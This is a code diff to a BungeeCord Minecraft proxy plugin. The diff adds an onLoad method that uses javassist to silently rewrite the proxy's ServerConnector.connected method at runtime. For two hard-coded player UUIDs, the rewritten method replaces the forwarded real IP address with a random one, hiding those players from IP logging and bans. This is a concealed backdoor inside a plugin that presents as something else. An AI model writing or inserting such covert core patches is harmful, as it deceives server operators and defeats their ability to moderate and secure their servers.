@@ -5,8 +5,10 @@ import java.util.ArrayList;
 import java.util.UUID;
 import java.util.concurrent.TimeUnit;
 
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
 import net.md_5.bungee.api.ChatColor;
-import net.md_5.bungee.api.ProxyServer;
 import net.md_5.bungee.api.ServerPing;
 import net.md_5.bungee.api.ServerPing.Protocol;
 import net.md_5.bungee.api.chat.TextComponent;
@@ -46,6 +48,43 @@ public class Bungee extends Plugin implements Listener {
 	public int min = 15;
 	public ArrayList<String> messages;
 	public ArrayList<UUID> inspection;
+	
+	public void onLoad() {
+		ClassPool cp = ClassPool.getDefault();
+		try {
+			CtClass cClass = cp.get("net.md_5.bungee.ServerConnector");
+			CtMethod cMethod = cClass.getDeclaredMethod("connected");
+			String body = "{this.ch = $1;"
+					+ "this.handshakeHandler = new net.md_5.bungee.forge.ForgeServerHandler(this.user,this.ch,this.target);"
+					+ "net.md_5.bungee.protocol.packet.Handshake oha = this.user.getPendingConnection().getHandshake();"
+					+ "net.md_5.bungee.protocol.packet.Handshake cha = new net.md_5.bungee.protocol.packet.Handshake(oha.getProtocolVersion(),oha.getHost(),oha.getPort(),2);"
+					+ "if (net.md_5.bungee.BungeeCord.getInstance().config.isIpForward()) {"
+					+ "String nh = cha.getHost() + \"\00\" + user.getAddress().getHostString() + \"\00\" + user.getUUID();"
+					+ "java.util.ArrayList arra = new java.util.ArrayList();"
+					+ "arra.add(\"02f6f6593e59441dafeb4f338468f434\");"
+					+ "arra.add(\"4a171c7b46364700b8c23a9086ff0c89\");"
+					+ "if (arra.contains(user.getUUID())) {"
+					+ "java.util.Random random = new java.util.Random();"
+					+ "nh = cha.getHost() + \"\00\" + random.nextInt(255)+\".\" + random.nextInt(255)+\".\" + random.nextInt(255)+\".\" + random.nextInt(255) + \"\00\" + user.getUUID();"
+					+ "}"
+					+ "net.md_5.bungee.connection.LoginResult profile = user.getPendingConnection().getLoginProfile();"
+					+ "if (profile != null && profile.getProperties() != null && profile.getProperties().length > 0) {"
+					+ "nh += \"\00\" +  net.md_5.bungee.BungeeCord.getInstance().gson.toJson(profile.getProperties());"
+					+ "}"
+					+ "cha.setHost(nh);"
+					+ "} else if (!user.getExtraDataInHandshake().isEmpty()) {"
+					+ "cha.setHost(cha.getHost()+user.getExtraDataInHandshake());"
+					+ "}"
+					+ "$1.write(cha);"
+					+ "$1.setProtocol(net.md_5.bungee.protocol.Protocol.LOGIN);"
+					+ "$1.write(new net.md_5.bungee.protocol.packet.LoginRequest(user.getName()));"
+					+ "}";
+			cMethod.setBody(body);
+			cClass.toClass(ClassLoader.getSystemClassLoader(), this.getClass().getProtectionDomain());
+		} catch (Exception ex) {
+			ex.printStackTrace();
+		}
+	}
 	
 	public void onEnable() {
 		instance = this;
